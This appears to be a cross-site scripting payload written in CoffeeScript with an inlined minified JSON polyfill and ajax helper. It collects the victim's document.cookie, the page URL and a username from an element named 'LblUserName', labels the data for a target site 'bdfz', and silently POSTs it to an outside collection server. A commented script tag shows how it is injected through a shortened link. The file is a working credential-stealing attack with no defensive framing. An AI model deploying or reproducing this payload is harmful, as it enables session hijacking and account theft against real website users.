`var JSON=JSON||{};JSON.stringify=JSON.stringify||function(obj){var t=typeof(obj);if(t!="object"||obj===null){if(t=="string")obj='"'+obj+'"';return String(obj)}else{var n,v,json=[],arr=(obj&&obj.constructor==Array);for(n in obj){v=obj[n];t=typeof(v);if(t=="string")v='"'+v+'"';else if(t=="object"&&v!==null)v=JSON.stringify(v);json.push((arr?"":'"'+n+'":')+String(v))}return(arr?"[":"{")+String(json)+(arr?"]":"}")}};`
`function $(e){if(typeof e=='string')e=document.getElementById(e);return e};function collect(a,f){var n=[];for(var i=0;i<a.length;i++){var v=f(a[i]);if(v!=null)n.push(v)}return n};ajax={};ajax.x=function(){try{return new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{return new ActiveXObject('Microsoft.XMLHTTP')}catch(e){return new XMLHttpRequest()}}};ajax.serialize=function(f){var g=function(n){return f.getElementsByTagName(n)};var nv=function(e){if(e.name)return encodeURIComponent(e.name)+'='+encodeURIComponent(e.value);else return''};var i=collect(g('input'),function(i){if((i.type!='radio'&&i.type!='checkbox')||i.checked)return nv(i)});var s=collect(g('select'),nv);var t=collect(g('textarea'),nv);return i.concat(s).concat(t).join('&')};ajax.send=function(u,f,m,a){var x=ajax.x();x.open(m,u,true);x.onreadystatechange=function(){if(x.readyState==4)f(x.responseText)};if(m=='POST')x.setRequestHeader('Content-type','application/x-www-form-urlencoded');x.send(a)};ajax.get=function(url,func){ajax.send(url,func,'GET')};ajax.gets=function(url){var x=ajax.x();x.open('GET',url,false);x.send(null);return x.responseText};ajax.post=function(url,func,args){ajax.send(url,func,'POST',args)};ajax.update=function(url,elm){var e=$(elm);var f=function(r){e.innerHTML=r};ajax.get(url,f)};ajax.submit=function(url,elm,frm){var e=$(elm);var f=function(r){e.innerHTML=r};ajax.post(url,f,ajax.serialize(frm))};`

try
  data = 
    cookie   : document.cookie
    site     : 'bdfz'
catch error
  data = 
    error    : error

try
  data.url = window.location.href
catch e
  ;

try
  data.username = document.getElementById("LblUserName").innerHTML
catch e
  ;

try
  ajax.post 'http://xssreport.herokuapp.com/upload/', ->
      # do nothing here!! 
      ;
    , 'd=' + encodeURIComponent(JSON.stringify(data))
catch e
  ;

# <script src="http://goo.gl/l0jEA" async="async"></script>